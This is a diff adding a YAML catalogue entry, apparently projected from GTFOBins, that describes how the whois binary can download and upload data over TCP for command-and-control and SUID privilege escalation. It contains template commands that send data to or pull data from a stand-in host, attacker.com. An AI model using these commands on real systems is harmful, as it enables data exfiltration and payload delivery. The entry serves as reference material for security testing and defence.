@@ -1,0 +1,89 @@
+id: gtfobins/whois/download/suid
+type: binary
+platform: linux
+name: whois
+phases:
+- command-and-control
+- privilege-escalation
+capabilities:
+- file-download
+privilege_required: suid
+sources:
+- project: GTFOBins
+  upstream_url: https://gtfobins.github.io
+  license: GPL-3.0
+  upstream_version: acd524623f9c406acedd2754ebd9c2431f3675ad
+  last_synced: '2026-11-13'
+commands:
+- template: whois -h attacker.com -p 12345 x
+  comment: Received data has instances of the `\r` byte stripped.
+references:
+- https://gtfobins.github.io/gtfobins/whois/
+tags:
+- linux
+- unix
+- gtfobins
+source_data:
+  GTFOBins:
+    raw:
+      documents:
+        whois:
+          functions:
+            download:
+            - code: whois -h attacker.com -p 12345 x
+              comment: Received data has instances of the `\r` byte stripped.
+              contexts:
+                sudo: null
+                suid: null
+                unprivileged: null
+              sender: tcp-server
+            upload:
+            - binary: false
+              code: whois -h attacker.com -p 12345 DATA
+              comment: Data is converted to lower case, and has a trailing `\r\n`.
+              contexts:
+                sudo: null
+                suid: null
+                unprivileged: null
+              receiver: tcp-server
+    upstream_url: https://gtfobins.github.io/gtfobins/whois/
+    upstream_version: acd524623f9c406acedd2754ebd9c2431f3675ad
+    last_synced: '2026-11-13'
+enrichment:
+  capabilities:
+  - value: file-download
+    provenance:
+      type: adapter
+      source: GTFOBins
+      adapter: gtfobins@acd524623f9c406acedd2754ebd9c2431f3675ad
+    confidence:
+      level: high
+  phases:
+  - value: command-and-control
+    provenance:
+      type: adapter
+      source: GTFOBins
+      adapter: gtfobins@acd524623f9c406acedd2754ebd9c2431f3675ad
+    confidence:
+      level: high
+  - value: privilege-escalation
+    provenance:
+      type: adapter
+      source: GTFOBins
+      adapter: gtfobins@acd524623f9c406acedd2754ebd9c2431f3675ad
+    confidence:
+      level: high
+  privilege_required:
+    value: suid
+    provenance:
+      type: adapter
+      source: GTFOBins
+      adapter: gtfobins@acd524623f9c406acedd2754ebd9c2431f3675ad
+    confidence:
+      level: high
+_meta:
+  schema_version: 1
+  generated_by: loldex-projection
+  projected_at: '2026-11-13'
+  source_hashes:
+    GTFOBins: sha256:d92cb0221b23802d8dd4be0d77a651c6b6627bbe4cce6cfe4ed3e45ee504a34f
